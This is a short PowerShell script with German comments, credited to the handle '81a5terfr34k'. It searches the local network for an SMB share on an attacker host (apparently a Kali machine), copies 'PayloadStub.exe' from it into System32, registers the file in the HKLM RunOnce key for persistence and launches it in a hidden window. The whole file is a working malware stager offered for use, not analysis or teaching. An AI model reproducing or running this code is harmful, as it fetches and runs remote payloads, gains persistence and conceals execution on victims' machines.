# Automatischer SMB-Discovery + Payload-Ausführung
# Autor: 81a5terfr34k

# ========== EINSTELLUNGEN ==========
$payloadFile = "PayloadStub.exe"
$remoteShareName = "share"
$subnet = "192.168.0"   # Passe bei Bedarf an
$startIP = 2
$endIP = 254
$localPath = "$env:windir\System32\$payloadFile"

# ========== FUNKTION 1: Prüfe auf \\kali.local ==========
$hostname = "kali"
$remotePath = "\\$hostname.local\$remoteShareName\$payloadFile"

Write-Host "[*] Prüfe auf Hostnamen '$hostname.local'..." -ForegroundColor Yellow

if (Test-Path $remotePath) {
    Write-Host "[+] SMB-Share gefunden unter $remotePath" -ForegroundColor Green
}
else {
    Write-Host "[!] Hostname nicht erreichbar. Starte Subnetz-Scan..." -ForegroundColor Red

    # ========== FUNKTION 2: Subnetz scannen ==========
    $found = $false
    for ($i = $startIP; $i -le $endIP; $i++) {
        $ip = "$subnet.$i"
        $remotePath = "\\$ip\$remoteShareName\$payloadFile"

        Write-Host "→ Teste $remotePath ..." -ForegroundColor DarkGray

        if (Test-Path $remotePath) {
            Write-Host "[+] Gefunden unter $remotePath" -ForegroundColor Green
            $found = $true
            break
        }
    }

    if (-not $found) {
        Write-Host "[!] Keine SMB-Freigabe gefunden. Abbruch." -ForegroundColor Red
        exit 1
    }
}

# ========== PAYLOAD HANDLING ==========
Write-Host "[*] Kopiere Payload von $remotePath nach $localPath ..." -ForegroundColor Cyan
Copy-Item $remotePath $localPath -Force

# RunOnce setzen
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" `
                 -Name "81a5_payload" -Value $localPath

Write-Host "[+] RunOnce-Eintrag gesetzt: $localPath" -ForegroundColor Cyan

# Direkt starten
Write-Host "[*] Starte Payload lokal..." -ForegroundColor Green
Start-Process $localPath -WindowStyle Hidden
